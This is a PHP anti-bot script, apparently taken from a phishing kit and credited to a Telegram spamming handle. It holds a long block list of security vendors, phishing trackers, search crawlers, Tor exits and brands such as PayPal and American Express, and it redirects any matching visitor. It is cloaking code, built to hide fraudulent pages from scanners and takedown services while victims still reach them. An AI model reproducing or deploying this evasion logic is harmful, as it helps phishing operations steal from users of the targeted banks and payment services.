<?php 
/*  
````````````````````````````````````````````````````````````````````````````````
``````````````````````````````````CODER INFO````````````````````````````````````
````````````````````````````````````````````````````````````````````````````````
``````````````````````````TELEGRAM: @ADVANCEDSPAMMING```````````````````````````
````````````````````````````````````````````````````````````````````````````````
````````````````````````````````.-/+osyyyso+/-.`````````````````````````````````
``````````````````````````````:oyhhhhhhhhhhhhhyo:```````````````````````````````
````````````````````````````/yhhhhhhhhhhhhhhhhhhhy/`````````````````````````````
``````````````````````````.shhhhhhhhhhhhhhhhhhhhhhhs.```````````````````````````
`````````````````````````.yhhhhhhhhhhhhhhhhhhhhhhhhhy.``````````````````````````
`````````````````````````shhhhhhhhhhhhhhhhhhhhhhhhhhhs``````````````````````````
``````````````````+++++`-hhhhhhhhhhhhhhhhhhhhhhhhhhhhh-`+++++```````````````````
`````````````````.hhhhh`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh+`hhhhh.``````````````````
`````````````````.hhhy+`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh/`+yhhh.``````````````````
`````````````````.hhh+``.hhhhhhyo++shhhhhhhs++oshhhhhh-``+hhh.``````````````````
`````````````````.hhh+```+hhhy.`````/hhhhh+`````.shhho```+hhh.``````````````````
`````````````````.hhh+```.hhho``````/hhhhho``````/hhh.```+hhh.``````````````````
`````````````````.hhh+````hhhho::/+shhh+hhhyo/::ohhhh````+hhh.``````````````````
`````````````````.hhh+```+hhhhhhhhhhhh+`/hhhhhhhhhhhh+```+hhh.``````````````````
`````````````````.hhh+```-shhhhhhhhhhs```ohhhhhhhhhhs-```+hhh.``````````````````
`````````````````.hhh+`````-ohhyhhhhhhhhhhhhhhhyhho-`````+hhh.``````````````````
`````````````````.hhh+``````````.yhhhhhhhhhhhy.``````````+hhh.``````````````````
`````````````````.hhh+```````````ohhhhhhhhhhho```````````+hhh.``````````````````
`````````````````.hhh+```````````+yhhhhhhhhhy+```````````+hhh.``````````````````
`````````````````.hhh+````````````....---....````````````+hhh.``````````````````
`````````````````.hhhyoooooooooooooooooooooooooooooooooooyhhh.``````````````````
`````````````````.yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.``````````````````
```````````.::::::///////////////.............///////////////::::::.````````````
```````````:hhhhhhhhhhhhhhhhhhhhho///////////ohhhhhhhhhhhhhhhhhhhhh/````````````
````````````/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/`````````````
`````````````.....................................................``````````````
````````````````````````````````````````````````````````````````````````````````
*/
$blocked_words = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler","googlebot","Googlebot-Video","bingbot","Baiduspider","Baiduspider-mobile","Baiduspider-video","Baiduspider-image","NaverBot","Yeti","Yandex","YandexBot","YandexMobileBot","YandexVideo","YandexWebmaster","YandexSitelinks","SeznamBot","AdsBot-Google","Twitterbot","Adidxbot","externalfacebookhit","Facebot","Yahoo Pipes 1.0","facebookexternalhit","EtaoSpider","amazon","netflix","Slurp","msnbot","Applebot","Googlebot-Image","teoma","ia_archiver","YandexDirect","gsa-crawler","OmniExplorer_Bot","msnbot-mobile","YahooSeeker","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal");

foreach($blocked_words as $word) {
if (substr_count($hostname, $word) > 0) {
    header( "HTTP/1.1 301 Moved Permanently" );
    header( "location: " . $antibot['redirect_url'] ); 
    exit();
}}
?>